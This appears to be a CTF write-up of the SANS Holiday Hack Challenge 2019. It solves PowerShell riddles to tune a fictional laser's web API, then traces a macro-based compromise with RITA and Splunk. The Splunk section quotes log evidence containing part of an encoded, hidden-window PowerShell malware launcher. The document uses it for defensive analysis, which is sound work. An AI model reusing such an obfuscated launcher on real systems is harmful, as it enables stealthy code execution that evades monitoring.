    🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲
    🗲                                                                                🗲
    🗲 Elf University Student Research Terminal - Christmas Cheer Laser Project       🗲
    🗲 ------------------------------------------------------------------------------ 🗲
    🗲 The research department at Elf University is currently working on a top-secret 🗲
    🗲 Laser which shoots laser beams of Christmas cheer at a range of hundreds of    🗲
    🗲 miles. The student research team was successfully able to tweak the laser to   🗲
    🗲 JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.   🗲
    🗲 Unfortunately, someone broke into the research terminal, changed the laser     🗲
    🗲 settings through the Web API and left a note behind at /home/callingcard.txt.  🗲
    🗲 Read the calling card and follow the clues to find the correct laser Settings. 🗲
    🗲 Apply these correct settings to the laser using it's Web API to achieve laser  🗲
    🗲 output of 5 Mega-Jollies per liter.                                            🗲
    🗲                                                                                🗲
    🗲 Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info.  🗲
    🗲                                                                                🗲
    🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲
    PS /home/elf>

Let's try to find the correct value for the different parameters. Let's start
with the :code:`Invoke-WebRequest` command:

.. code-block:: ps1con

    PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Mon, 23 Dec 2019 20:01:04 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 860

    <html>
    <body>
    <pre>
    ----------------------------------------------------
    Christmas Cheer Laser Project Web API
    ----------------------------------------------------
    Turn the laser on/off:
    GET http://localhost:1225/api/on
    GET http://localhost:1225/api/off

    Check the current Mega-Jollies of laser output
    GET http://localhost:1225/api/output

    Change the lense refraction value (1.0 - 2.0):
    GET http://localhost:1225/api/refraction?val=1.0

    Change laser temperature in degrees Celsius:
    GET http://localhost:1225/api/temperature?val=-10

    Change the mirror angle value (0 - 359):
    GET http://localhost:1225/api/angle?val=45.1

    Change gaseous elements mixture:
    POST http://localhost:1225/api/gas
    POST BODY EXAMPLE (gas mixture percentages):
    O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
    ----------------------------------------------------
    </pre>
    </body>
    </html>

Alright, there is an API available on the research lab computer, where we can
change the value of the different parameters of the laser. So, once we find the
correct values for the laser's parameters, we'll input them here.

Now, let's take a look at this calling card file:

.. code-block:: ps1con
    :hl_lines: 6

    PS /home/elf> Get-Content /home/callingcard.txt
    What's become of your dear laser?
    Fa la la la la, la la la la
    Seems you can't now seem to raise her!
    Fa la la la la, la la la la
    Could commands hold riddles in hist'ry?
    Fa la la la la, la la la la
    Nay! You'll ever suffer myst'ry!
    Fa la la la la, la la la la

The calling card seems to imply that we can find some riddles in the command
history. So let's dig into it:

.. code-block:: ps1con
    :hl_lines: 11 13

    PS /home/elf> get-history

      Id CommandLine
      -- -----------
       1 Get-Help -Name Get-Process 
       2 Get-Help -Name Get-* 
       3 Set-ExecutionPolicy Unrestricted 
       4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm 
       5 Get-Service | Export-CSV c:\service.csv 
       6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
       7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
       8 Get-EventLog -Log "Application" 
       9 I have many name=value variables that I share to applications system wide. At a com…

We've found the correct value for the angle, which seems to be :code:`65.5`.
The ninth entry also seems interesting, let's take a look at it:

.. code-block:: ps1con

    PS /home/elf> get-history -id 9  | format-list

    Id                 : 9
    CommandLine        : I have many name=value variables that I share to applications 
                         system wide. At a command I will reveal my secrets once you Get my 
                         Child Items.
    ExecutionStatus    : Completed
    StartExecutionTime : 11/29/19 4:57:16 PM
    EndExecutionTime   : 11/29/19 4:57:16 PM
    Duration           : 00:00:00.6090308

Sharing :code:`name=value` variables system wide... This seems to point to
`environment variables <https://en.wikipedia.org/wiki/Environment_variable>`__.
Let's explore the environment variables, using the :code:`env:` object:

.. code-block:: ps1con
    :hl_lines: 18

    PS /home/elf> Get-ChildItem env:

    Name                           Value
    ----                           -----
    _                              /bin/su
    DOTNET_SYSTEM_GLOBALIZATION_I… false
    HOME                           /home/elf
    HOSTNAME                       ed982fcad65c
    LANG                           en_US.UTF-8
    LC_ALL                         en_US.UTF-8
    LOGNAME                        elf
    MAIL                           /var/mail/elf
    PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bi…
    PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mod…
    PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/shar…
    PWD                            /home/elf
    RESOURCE_ID                    f8a577fa-4565-46c9-a2b6-5ab85e9da0e1
    riddle                         Squeezed and compressed I am hidden away. Expand me from …
    SHELL                          /home/elf/elf
    SHLVL                          1
    TERM                           xterm
    USER                           elf
    USERDOMAIN                     laserterminal
    userdomain                     laserterminal
    username                       elf
    USERNAME                       elf

The :code:`riddle` variable seems interesting. Let's expand it:

.. code-block:: ps1con

    PS /home/elf> Get-ChildItem env:riddle | Format-List

    Name  : riddle
    Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will 
            show you the way. Recurse through all /etc and Sort on my LastWriteTime to 
            reveal im the newest of all.

Alright, let's list every file in :code:`/etc` and sort by their
:code:`LastWriteTime` attribute:

.. code-block:: ps1con
    :hl_lines: 7

    PS /home/elf> Get-ChildItem -recurse /etc | sort LastWriteTime
    [...]
        Directory: /etc/apt

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    --r---          12/23/19  8:35 PM        5662902 archive

The newest file seems to be an archive. Let's extract it:

.. code-block:: ps1con
    :hl_lines: 18 19

    PS /home/elf> Expand-Archive -Path /etc/apt/archive -DestinationPath extracted_archive
    PS /home/elf> dir
    Directory: /home/elf                                                                  
                                                                                              
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-r---          12/13/19  5:15 PM                depths
    d-----          12/23/19  8:37 PM                extracted_archive
    --r---          12/13/19  4:29 PM           2029 motd
    PS /home/elf> cd ./extracted_archive/refraction
    PS /home/elf/extracted_archive/refraction> dir


        Directory: /home/elf/extracted_archive/refraction

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    ------           11/7/19 11:57 AM            134 riddle
    ------           11/5/19  2:26 PM        5724384 runme.elf

The archive contains an ELF binary, and a riddle. First, let's run the ELF
binary. I didn't manage to run it from the box, so I extracted it, by base64
encoding it, and then decoding it on a Linux box. I was then able to run it:

.. code-block:: console
    :hl_lines: 2

    user@debian:~$ ./powershell_elf.bin
    refraction?val=1.867

This gives us the correct value for the refraction variable. Now, let's look
at the :code:`riddle` file:

.. code-block:: ps1con

    PS /home/elf/extracted_archive/refraction> Get-Content ./riddle
    Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:

    25520151A320B5B0D21561F92C8F6224

So, we must look for a file in the :code:`/home/elf/depths` folder, with an
MD5 sum equal to :code:`25520151A320B5B0D21561F92C8F6224`. Let's take a look:

.. code-block:: ps1con
    :hl_lines: 5

    PS /home/elf> Get-ChildItem -file -recurse ./depths/ | get-filehash -algorithm MD5 | where-object { $_.HASH -eq "25520151A320B5B0D21561F92C8F6224" } | Format-List

    Algorithm : MD5
    Hash      : 25520151A320B5B0D21561F92C8F6224
    Path      : /home/elf/depths/produce/thhy5hll.txt

The file with an MD5 sum of :code:`25520151A320B5B0D21561F92C8F6224` seems to
be :code:`/home/elf/depths/produce/thhy5hll.txt`. Let's look inside:

.. code-block:: ps1con
    :hl_lines: 2

    PS /home/elf> Get-Content /home/elf/depths/produce/thhy5hll.txt
    temperature?val=-33.5

    I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.

We now have the correct value for the temperature, :code:`-33.5`.

Apparently, the new file to find is the one with the longest full name in
:code:`/home/elf/depths`. Let's list the file and sort them by their
:code:`FullName` attribute:

.. code-block:: ps1con

    PS /home/elf/> Get-ChildItem -file -recurse /home/elf/depths | sort {  $_.FullName.length } | select-object -property FullName | fl
    [...]
    FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/
               escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/p
               ractical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/da
               wn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soo
               n/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
    PS /home/elf/extracted_archive/refraction> gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
    Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:

    bushy
    alabaster
    minty
    holly

    Do this for me and then you /shall/see .

Once we find the file with the longest name, we're tasked with a new challenge.
We must kill the processes of the given users, in this particular order. Let's
list the processes and kill them:

.. code-block:: ps1con

    PS /home/elf> Get-Process -IncludeUserName

         WS(M)   CPU(s)      Id UserName                       ProcessName
         -----   ------      -- --------                       -----------
         26.84     1.86       7 root                           CheerLaserServi
        184.41    61.33      32 elf                            elf
          3.56     0.04       1 root                           init
          0.82     0.00      24 bushy                          sleep
          0.82     0.00      26 alabaster                      sleep
          0.75     0.00      29 minty                          sleep
          0.82     0.00      30 holly                          sleep
          3.32     0.00      31 root                           su

    PS /home/elf/extracted_archive/refraction> Stop-Process -Id 24
    PS /home/elf/extracted_archive/refraction> Stop-Process -Id 26
    PS /home/elf/extracted_archive/refraction> Stop-Process -Id 29
    PS /home/elf/extracted_archive/refraction> Stop-Process -Id 30

After killing the processes, the riddle said that we :code:`/shall/see`. Let's
look into the :code:`/shall` folder at the root of the file system:

.. code-block:: ps1con
    :hl_lines: 8

    PS /home/elf/extracted_archive/refraction> dir /shall


        Directory: /shall

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    --r---          12/23/19  8:55 PM            149 see

There is indeed a :code:`/shall/see` file. Let's get its content:

.. code-block:: ps1con

    PS /home/elf> Get-Content /shall/see
    Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.

So, there is an event log in XML format in :code:`/etc`. We must find the event
with the unique :code:`Id`, and the last parameters for the alser will be in
its properties. First, let's find this XML file:

.. code-block:: ps1con
    :hl_lines: 11 15

    PS /home/elf/extracted_archive/refraction> Get-ChildItem -recurse -file -include "*.xml" /etc       
    Get-ChildItem : Access to the path '/etc/ssl/private' is denied.
    At line:1 char:1
    + Get-ChildItem -recurse -file -include "*.xml" /etc
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
     


        Directory: /etc/systemd/system/timers.target.wants

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    --r---          11/18/19  7:53 PM       10006962 EventLog.xml

So, the event log sits at :code:`/etc/systemd/system/timers.target.wants/EventLog.xml`.
We can directly parse the content of the file in PowerShell:

.. code-block:: ps1con

    PS /home/elf> [xml]$event_log = gc /etc/systemd/system/timers.target.wants/EventLog.xml

Then, let's take a look at every :code:`Id` to see which one is unique:

.. code-block:: ps1con
    :hl_lines: 5

    PS /home/elf> $event_log.Objs.Obj.Props.I32 | ? { $_.N -eq "Id" } | % {$_.'#text'} | Group-Object | Format-Table count, name   

    Count Name
    ----- ----
        1 1
       39 2
      179 3
        2 4
      905 5
       98 6

So, the unique :code:`Id` seems to be :code:`1`. Let's list the properties of
the event with :code:`Id=1`:

.. code-block:: ps1con
    :hl_lines: 9

    PS /home/elf> $event_log.Objs.Obj | ? { $_.Props.I32.N -eq 'Id' -and $_.Props.I32.'#text' -eq 1} | % { $_.Props.Obj.LST.Obj.Props.S.'#text' }
    2019-11-07 17:59:56.525
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    10.0.14393.206 (rs1_release.160915-0644)
    Windows PowerShell
    Microsoft® Windows® Operating System
    Microsoft Corporation
    PowerShell.EXE
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n"
    C:\
    ELFURESEARCH\allservices
    High
    MD5=097CE5761C89434367598B34FE32893B
    C:\Windows\System32\svchost.exe
    C:\Windows\system32\svchost.exe -k netsvcs

This gives us the values for the gas dosage for the laser. We now have every
parameters to repair the laser.

First let's update the angle:

.. code-block:: ps1con

    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Tue, 24 Dec 2019 11:42:25 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 77

    Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.

Now the refraction:

.. code-block:: ps1con

    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Tue, 24 Dec 2019 11:42:30 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 87

    Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.

Then the temperature:

.. code-block:: ps1con

    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Tue, 24 Dec 2019 11:42:34 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 82

    Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.

And finally the gas levels:

.. code-block:: ps1con

    PS /home/elf> $correct_gases_postbody = @{ O=6; H=7; He=3; N=4; Ne=22; Ar=11; Xe=10; F=20; Kr=8; Rn=9}
    PS /home/elf> (Invoke-WebRequest -Uri http://127.0.0.1:1225/api/gas -Method POST -Body $correct_gases_postbody).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Tue, 24 Dec 2019 11:42:45 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 81

    Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.

Aaaaand:

.. code-block:: ps1con

    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Mon, 30 Dec 2019 12:39:57 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 58

    Failure - Only 2.17 Mega-Jollies of Laser Output Reached!

It didn't work! Hmm, maybe we should try `turning it off and on again? <https://www.youtube.com/watch?v=p85xwZ_OLX0>`__

.. code-block:: ps1con

    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/off).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Mon, 30 Dec 2019 12:40:12 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 33

    Christmas Cheer Laser Powered Off
    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/on).RawContent 
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Mon, 30 Dec 2019 12:40:18 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 32

    Christmas Cheer Laser Powered On
    PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent
    HTTP/1.0 200 OK                                                                           
    Server: Werkzeug/0.16.0                                                                   
    Server: Python/3.6.9                                                                      
    Date: Mon, 30 Dec 2019 12:40:21 GMT                                                       
    Content-Type: text/html; charset=utf-8
    Content-Length: 200

    Success! - 5.47 Mega-Jollies of Laser Output Reached!

There you go!

Network Log Analysis: Determine Compromised System
--------------------------------------------------

We're given `Zeek logs <https://downloads.elfu.org/elfu-zeeklogs.zip>`__ to try
and identify the IP address of the infected computer. Among the log files,
we can see some HTML files. Let's open them in our browser:

.. image:: /images/sans-christmas-challenge-2019/rita_index.png
    :alt: rita_index.png
    :align: center

We have the web interface to `RITA <https://github.com/activecm/rita>`__, the
Real Intelligence Threat Analytics tool. It can ingest Bro or Zeek logs, and
detect several suspicious behaviour on the network, including **beaconing
behaviour**. This means that it can likely help us identify the machine that
was infected, and is likely taking order from a `C2 server <https://en.wikipedia.org/wiki/Botnet#Command_and_control>`__.

Let's go over the "Beacons" tab:

.. image:: /images/sans-christmas-challenge-2019/rita_beacons.png
    :alt: rita_beacons.png
    :align: center

By far, the most suspicious activity seems to be between internal IP
:code:`192.168.134.130` and external IP :code:`144.202.46.214`. This means that
the infected machine is likely :code:`192.168.134.130`.

Objective 6: Splunk
~~~~~~~~~~~~~~~~~~~

Now that we have solved objectives 2 through 5, let's go talk to Santa again.

.. image:: /images/sans-christmas-challenge-2019/santa_squad.png
    :alt: santa_squad.png
    :align: center

*Santa says*

    Thank you for finding `Jane <https://disney.fandom.com/wiki/Jane_Banks>`__
    and `Michael <https://disney.fandom.com/wiki/Michael_Banks>`__, our two
    turtle doves!

    I’ve got an uneasy feeling about how they disappeared.

    Turtle doves wouldn’t wander off like that.

    Someone must have stolen them! Please help us find the thief!

    It’s a moral imperative!

    I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!

    Gosh, I can’t help but think:

    Winds in the East, snow coming in…

    Like something is brewing and about to begin!

    Can’t put my finger on what lies in store,

    `But I fear what’s to happen all happened before! <https://www.youtube.com/watch?v=SSfGBskfthg>`__

We're asked to contact the Elf U SOC team via their `Splunk server <https://splunk.elfu.org/>`__
(credentials :code:`elf:elfsocks`).

We first have a little chat with Kent:

    **Guest (me):** Hi Kent :-)

    **Kent:** Hi yourself.

    **Guest (me):** I ran into Professor Banas. He said you contacted him about
    his computer being hacked?

    **Kent:** Oh, well lots of analysts try to make it here in the ELF U SOC,
    but most of them crack under the pressure

    **Guest (me):** Well, can I help?

    **Kent:** You can try. Go check out #ELFU SOC. Maybe someone there will
    have time to bring you up to speed. Here's a tip, click on those blinking
    red dots to the left column and read very carefully.

    **Guest (me):** Thanks???

Alright, Kent... Way to be an ass. Anyway, let's check the #ELFU SOC channel:

    **Cosmo Jingleberg:** Hey did you all see that beaconing detection from
    RITA?

    **Zippy Frostington:** Yep. And we have some system called 'sweetums' here
    on campus communicating with the same weird IP

    **Alice Bluebird:** Gah... that's Professor Banas' system from over in the
    Polar Studies department

    **Guest (me):** That's why I'm here, actually...Kent sent me to this
    channel to help with Prof. Banas' system

    **Alice Bluebird:** smh...I'll DM you

And in DM with Alice:

    **Alice Bluebird:** Okay. Your goal is to find the message for Kent that
    the adversary embedded in this attack.

    If you think you have the chops for that, don't let me slow you down. Get
    searching and enter the Challenge Question answer when you've found it.

    You'll need to know some things, though:

       * We use Splunk, so click `here <https://splunk.elfu.org/en-US/app/SA-elfusoc/search>`__
         or hit the Search link in the navigation up above to get started.
       * I copied some raw files `here <http://elfu-soc.s3-website-us-east-1.amazonaws.com/>`__
         or click the File Archive link in the navigation. (You'll find some
         references to the File Archive contents in Splunk)

    **You'll need to use both of these resources to answer the Challenge
    Question!**

    Don't worry though, I can get you started down the right path with a few
    hints if you need 'em. All you have to do is answer the first training
    question. If you've read all the chat windows here, you already have the
    answer ;-)

Answering the challenge question
--------------------------------

Alright, we're supposed to find the message the attacker left for Kent. Alice
says that we need both the Splunk search tool and the raw file archive to
answer this question. However, just using the file archive is possible.

By taking a look at the `file archive <http://elfu-soc.s3-website-us-east-1.amazonaws.com/>`__
URL, we can see that it's hosted on an AWS S3 bucket. Browsing the web
interface is not super practical, so let's download the bucket using the `AWS
CLI <https://aws.amazon.com/cli/>`__ tools:

.. code-block:: console

    $ aws s3 sync s3://elfu-soc . --no-sign-request --region us-east-1

The :code:`--no-sign-request` flag is used to tell the tool that we don't
want to try to authenticate: we want to download the S3 content as an
anonymous user.

We can now search the raw files for mentions of Kent:

.. code-block:: console

    $ cd "stoQ  Artifacts"
    $ grep -Rn 'Kent' .
    ./home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4:2:<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Holiday Cheer Assignment</dc:title><dc:subject>19th Century Cheer</dc:subject><dc:creator>Bradly Buttercups</dc:creator><cp:keywords></cp:keywords><dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description><cp:lastModifiedBy>Tim Edwards</cp:lastModifiedBy><cp:revision>4</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2019-11-19T14:54:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2019-11-19T17:50:00Z</dcterms:modified><cp:category></cp:category></cp:coreProperties>

The message is :code:`Kent you are so unfair. And we were going to make you the
king of the Winter Carnival.`. We got the correct answer, and we didn't need to
use Splunk!

Answering the training questions
--------------------------------

However, the SANS Challenges are about learning new skills. Being on the red
side of infosec, I don't often see how the blue team operates. So I thought it
would be fun to try and learn how to search for an attacker using Splunk.

So let's answer the training questions!

First question
..............

1. What is the short host name of Professor Banas' computer?

This one is easy, we can find the info in the #ELFU SOC chan: :code:`sweetums`.

Second question
...............

2. What is the name of the sensitive file that was likely accessed and copied
   by the attacker? Please provide the fully qualified location of the file.
   (Example: C:\temp\report.pdf)

By DM, Alice tells us that the Elf U staff is worried that the attacker may
have accessed Santa's sensitive data. So let's search for :code:`santa` in
the `Splunk search engine <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20index%3Dmain%20santa&display.page.search.mode=smart&dispatch.sample_ratio=1&earliest=0&latest=now&display.general.type=events&display.page.search.tab=events&sid=1577722638.3279>`__.

The very first result is a suspiciously long PowerShell command accesses a file
likely sent by Santa to Professor Banas:

.. code-block:: text
    :hl_lines: 19

    08/25/2019 09:19:20 AM
    LogName=Microsoft-Windows-PowerShell/Operational
    SourceName=Microsoft-Windows-PowerShell
    EventCode=4103
    EventType=4
    Type=Information
    ComputerName=sweetums.elfu.org
    User=NOT_TRANSLATED
    Sid=S-1-5-21-1217370868-2414566453-2573080502-1004
    SidType=0
    TaskCategory=Executing Pipeline
    OpCode=To be used when operation is just executing a method
    RecordNumber=417616
    Keywords=None
    Message=CommandInvocation(Stop-AgentJob): "Stop-AgentJob"
    CommandInvocation(Format-List): "Format-List"
    CommandInvocation(Out-String): "Out-String"
    ParameterBinding(Stop-AgentJob): name="JobName"; value="4VCUDA"
    ParameterBinding(Format-List): name="InputObject"; value="C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt:1:Carl, you know there's no one I trust more than you to help.  Can you have a look at this draft Naughty and Nice list for 2019 and let me know your thoughts? -Santa"
    ParameterBinding(Out-String): name="InputObject"; value="Microsoft.PowerShell.Commands.Internal.Format.FormatStartData"
    ParameterBinding(Out-String): name="InputObject"; value="Microsoft.PowerShell.Commands.Internal.Format.GroupStartData"
    ParameterBinding(Out-String): name="InputObject"; value="Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData"
    ParameterBinding(Out-String): name="InputObject"; value="Microsoft.PowerShell.Commands.Internal.Format.GroupEndData"
    ParameterBinding(Out-String): name="InputObject"; value="Microsoft.PowerShell.Commands.Internal.Format.FormatEndData"


    Context:
            Severity = Informational
            Host Name = ConsoleHost
            Host Version = 5.1.17134.858
            Host ID = c44dfd99-a4ba-452c-bf0d-07206a97112b
            Host Application = powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgA
            [...]

The file that was accessed is :code:`C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt`.

Third question
..............

3. What is the fully-qualified domain name(FQDN) of the command and control(C2)
   server? (Example: badguy.baddies.com) 

So, we know that the malware is likely using PowerShell. So let's search for
:code:`powershell.exe` in the `Splunk search engine <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20index%3Dmain%20powershell.exe&display.page.search.mode=smart&dispatch.sample_ratio=1&earliest=0&latest=now&display.general.type=events&display.page.search.tab=events&sid=1577723101.3323>`__.

By looking at the different fields on the side, we can see one named
:code:`DestinationHostname`, which is prety self-explanatory: it's likely the
hostnames that our PowerShell processes are communicating with:

.. image:: /images/sans-christmas-challenge-2019/splunk_powershell_destination_hostname.png
    :alt: splunk_powershell_destination_hostname.png
    :align: center

We can see that around 92% of every events concerning :code:`powershell.exe`
are communicating with the hostname :code:`144.202.46.214.vultr.com`. This is
most likely our C2 FQDN.

Fourth question
...............

4. What document is involved with launching the malicious PowerShell code?
   Please provide just the filename. (Example: results.txt) 

Now, by taking a look at the different logs, we can see that Prof. Cabanas has
received a lot of emails by students, sending their assignments as attachments.
The most likely compromise path probably involves a malicious Microsoft Office
document with embedded macros that ran the malicious PowerShell code.

Let's search for the Microsoft Word process :code:`WINWORD.EXE` in the `Splunk
search engine <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20winword.exe&sid=1577783349.64&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=0&latest=now>`__.
By taking a look at the :code:`RuleName` attributes, we can see that one
Microsoft Word process triggered a rule called "Execution - Suspicious WMI
module load". This can indicate the execution of a macro in a Word document:

.. image:: /images/sans-christmas-challenge-2019/splunk_winword_rule.png
    :alt: splunk_winword_rule.png
    :align: center

Let's investigate `this particular <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20winword.exe%20RuleName%3D%22Execution%20-%20Suspicious%20WMI%20module%20load%22&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=0&latest=now&sid=1577783465.72>`__
:code:`WINWORD.EXE` process. We can see from the Splunk search engine that it
was run at around 5:18 PM on 2019-08-25. This Microsoft Word process had a PID
of 6268.

.. image:: /images/sans-christmas-challenge-2019/splunk_winword_pid.png
    :alt: splunk_winword_pid.png
    :align: center

Let's search only for this PID in the `Splunk search engine <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20process_id%3D6268&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=0&latest=now&sid=1577783848A>`__.

.. image:: /images/sans-christmas-challenge-2019/splunk_winword_file_path.png
    :alt: splunk_winword_file_path.png
    :align: center

We can see in the :code:`file_path` attribute that this process opened a
document called :code:`C:\Users\cbanas\AppData\Local\Packages\oice_16_974fa576_32c1d314_3570\AC\Temp\26251897.docm`.
This looks like a good candidate. Indeded, :code:`.docm` documents are Office
Documents that can execute macros. However, :code:`26251897.docm`, is not the
original name of this document.

We can see that it's in Prof Banas' temporary folder, with a temporary name.
This often happens if the file was directly open from the Internet, or from an
archive without first decompressing it to disk.

We know the Microsoft Word process responsible for executing the PowerShell
payload was launched at around 5:18 Pm on 2019-08-25. Let's look for `emails
received around that time <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20mail&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=1566753300&latest=1566753600&sid=1577783990.89>`__.

We can see that only one email was received around that time:

.. image:: /images/sans-christmas-challenge-2019/splunk_email.png
    :alt: splunk_email.png
    :align: center

It had, indeed, a ZIP archive as an attachment, containing a document called
:code:`19th Century Holiday Cheer Assignment.docm`.

Fifth question
..............

5. How many unique email addresses were used to send Holiday Cheer essays to
   Professor Banas? Please provide the numeric value. (Example: 1) 

Now that is a question I find more easily answered using the `file archive
<http://elfu-soc.s3-website-us-east-1.amazonaws.com/>`__. We can :code:`grep`
